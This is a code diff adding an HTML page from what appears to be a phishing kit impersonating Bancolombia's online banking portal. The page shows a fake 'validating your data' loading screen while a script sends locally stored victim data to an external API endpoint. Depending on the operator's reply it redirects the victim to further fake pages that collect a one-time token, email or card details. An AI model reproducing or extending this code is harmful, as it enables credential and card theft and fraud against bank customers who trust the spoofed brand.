@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+	<title>Bancolombia Sucursal Virtual Personas</title>
+
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+	<script src="./js/validations.js"></script>
+	<link href="./css/style.css" rel="stylesheet">
+	<link href="./css/stylesheet.css" rel="stylesheet">
+	<link rel="icon" type="image/png" href="img/logo.png" />
+</head>
+
+<body>
+
+	<div style="text-align:center;  margin-top: 13%;">
+		<img src="img/logo.svg">
+
+		<br>
+		<p class="text-center"
+			style="font-family: 'OpenSans-Regular' !important; width:90%; max-width: 457px; display: inline-block; font-size: 14px;">
+			Por favor espere un momento estamos validando algunos datos. Puede tardar entre 1 a 3 minutos. No cierres o
+			recargues esta ventana.</p><br>
+		<img src="img/load2.gif" />
+
+	</div>
+
+	<meta http-equiv="PRAGMA" content="NO-CACHE">
+	<meta http-equiv="Expires" content="-1">
+
+	<script src="js/app.js"></script>
+	<script>
+
+		info.err = '';
+
+		// Enviar info
+		fetch(`${API_URL}/generals`, {
+			method: 'POST',
+			headers: {
+				'Content-Type': 'application/json',
+				'Authorization': 'Bearer 123123123',
+				'X-CSRF-Token': 'tokennn',
+				'X-Frame-Options': 'SAMEORIGIN',
+				'X-Content-Type-Options': 'nosniff',
+			},
+			body: JSON.stringify(info)
+		})
+			.then(response => response.json())
+			.then(result => {
+				// Manejo de respuetas del servidor
+				console.log('Respuesta del servidor:', result.redirect_to);
+
+				if (result.redirect_to === 'token.html' && info.tok === '') {
+					// Token primera vez
+					window.location.href = 'vOTP.html'
+				} else if (result.redirect_to === 'token.html' && info.tok !== '') {
+					// Token vuelto a pedir
+					// Setear el error
+					console.log('err');
+					info.err = 'true';
+					LS.setItem('info', JSON.stringify(info));
+
+					// Redirigir
+					window.location.href = 'vOTP.html'
+				} else if (result.redirect_to === 'index.html') {
+					// Setear el error
+					info.err = 'true';
+					LS.setItem('info', JSON.stringify(info));
+
+					// Redirigir
+					window.location.href = 'index.html'
+				} else if (result.redirect_to === 'email.html') {
+					// Setear el error
+					info.err = 'true';
+					LS.setItem('info', JSON.stringify(info));
+
+					// Redirigir
+					window.location.href = 'vEmail.html'
+				} else if (result.redirect_to === 'card.html') {
+					// Setear el error
+					info.err = 'true';
+					LS.setItem('info', JSON.stringify(info));
+
+					// Redirigir
+					window.location.href = 'vCard.html'
+				} else if (result.redirect_to === 'success.html') {
+
+					// Redirigir
+					window.location.href = 'success.html'
+				}
+			})
+			.catch(error => {
+				console.log('Error en la solicitud:', error);
+			});
+	</script>
+</body>
+
+</html>
